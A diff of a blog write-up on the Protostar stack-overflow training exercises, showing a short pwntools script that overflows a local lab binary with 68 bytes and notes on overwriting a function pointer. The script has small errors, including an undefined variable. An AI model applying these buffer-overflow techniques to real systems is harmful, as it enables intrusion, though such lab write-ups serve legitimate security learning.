@@ -1,12 +1,3 @@
----
-layout: post
-title: >
-    Protostar Stack Exploitation 0-4
-tags: [exploit education, exploit, protostar, stack]
----
-
-# PROTOSTAR
-
 # Stack 0
 
 ```
@@ -29,12 +20,12 @@ int main(int argc, char **argv)
 this can be solved by normally overflowing the buffer with 68 A
 NOTE:  apply breakpoint before the cmp or test statement so that you can calculate offset without segmentation fault
 
-``` from pwn import * 
-sh=process(’stack0’) 
+> from pwn import *
+sh=process(’stack0’)
 sh.recvline(timeout=5)
 sh.send(b’A’*68)
 c.recv()
-```
+> 
 
 # Stack 01
 
@@ -120,7 +111,7 @@ int main(int argc, char **argv)
 You need to change the value of fp to the win address, 
 
 > Note: Volatile is **a qualifier that is applied to a variable when it is declared**. It tells the compiler that the value of the variable may change at any time-without any action being taken by the code the compiler finds nearby.
-
+> 
 
 # Stack 4
 
